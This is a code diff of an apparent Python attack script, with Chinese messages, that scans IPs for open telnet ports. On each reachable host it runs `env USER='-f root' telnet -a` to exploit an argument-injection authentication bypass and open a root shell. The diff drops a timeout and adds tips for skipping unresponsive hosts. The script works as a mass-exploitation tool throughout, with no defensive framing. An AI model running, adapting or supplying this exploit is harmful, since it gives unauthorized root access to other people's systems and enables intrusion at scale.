@@ -42,22 +42,20 @@ def check_connectivity(ip, port=23, timeout=7):
         return False
 
 def run_telnet_session(ip):
+
     if not check_connectivity(ip, timeout=CONNECT_TIMEOUT):
         print(f"[-] 跳过 IP: {ip}")
         return
-    
-    command_str = f"timeout 10 env USER='-f root' telnet -a {ip}"
-    
+    command_str = f"env USER='-f root' telnet -a {ip}"
     print(f"\n{'='*30}")
     print(f"连接成功: {ip}")
     print(f"{'='*30}")
     print("提示: 操作完毕后输入 'quit' 来退出。")
+    print("注意！！！若出现I don't hear you! 请输入ctrl+] 和 quit 来跳过这个ip")
     try:
-        result = subprocess.call(command_str, shell=True)
-        if result == 124:
-            print(f"[!] Telnet 会话超时（可能遇到 'I don't hear you!' 或无响应），自动跳过")
+        subprocess.call(command_str, shell=True)
     except KeyboardInterrupt:
-        print("\n\n[!] 用户中断,脚本停止运行。")
+        print("\n\n[!] 用户中断，脚本停止运行。")
         sys.exit(1)
 
 def main():
